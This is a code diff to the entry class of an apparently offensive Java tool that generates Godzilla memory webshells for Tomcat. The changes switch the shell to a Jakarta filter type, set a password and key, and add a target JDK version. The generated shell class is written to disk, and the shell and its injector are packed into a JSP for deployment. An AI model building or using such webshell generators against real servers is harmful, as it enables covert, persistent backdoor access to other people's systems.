@@ -3,6 +3,7 @@ package com.reajason.javaweb;
 import com.reajason.javaweb.config.*;
 import com.reajason.javaweb.memsell.packer.JspPacker;
 import com.reajason.javaweb.memsell.tomcat.TomcatShell;
+import net.bytebuddy.jar.asm.Opcodes;
 
 import java.io.IOException;
 import java.nio.file.Files;
@@ -16,14 +17,14 @@ public class GeneratorMain {
     public static void main(String[] args) throws IOException {
         Server server = Server.TOMCAT;
         ShellTool shellTool = ShellTool.Godzilla;
-        String shellType = TomcatShell.FILTER;
+        String shellType = TomcatShell.JAKARTA_FILTER;
         GodzillaShellConfig shellConfig = GodzillaShellConfig.builder()
-                .pass("pass")
-                .key("key")
+                .pass("passFilter")
+                .key("keyFilter")
                 .headerName("User-Agent")
                 .headerValue("test")
                 .build();
-        GenerateResult generateResult = generate(server, shellTool, shellType, shellConfig);
+        GenerateResult generateResult = generate(server, shellTool, shellType, shellConfig, Opcodes.V11);
         if (generateResult != null) {
             String shellBytesBase64Str = generateResult.getShellBytesBase64Str();
             String injectorBytesBase64Str = generateResult.getInjectorBytesBase64Str();
@@ -31,6 +32,7 @@ public class GeneratorMain {
             System.out.println(shellConfig.getShellClassName() + " : " + shellBytesBase64Str);
             System.out.println(shellConfig.getInjectorClassName() + " : " + injectorBytesBase64Str);
             System.out.println(shellConfig);
+            Files.write(Paths.get(shellConfig.getShellClassName() + ".class"), generateResult.getShellBytes());
             JspPacker jspPacker = new JspPacker();
             String jspContent = new String(jspPacker.pack(generateResult));
             System.out.println(jspContent);
@@ -38,9 +40,13 @@ public class GeneratorMain {
     }
 
     public static GenerateResult generate(Server server, ShellTool shellTool, String shellType, ShellConfig shellConfig) {
+        return generate(server, shellTool, shellType, shellConfig, Constants.DEFAULT_VERSION);
+    }
+
+    public static GenerateResult generate(Server server, ShellTool shellTool, String shellType, ShellConfig shellConfig, int targetJdkVersion) {
         switch (server) {
             case TOMCAT:
-                return TomcatShell.generate(shellTool, shellType, shellConfig);
+                return TomcatShell.generate(shellTool, shellType, shellConfig, targetJdkVersion);
             case BES:
                 break;
             case RESIN:
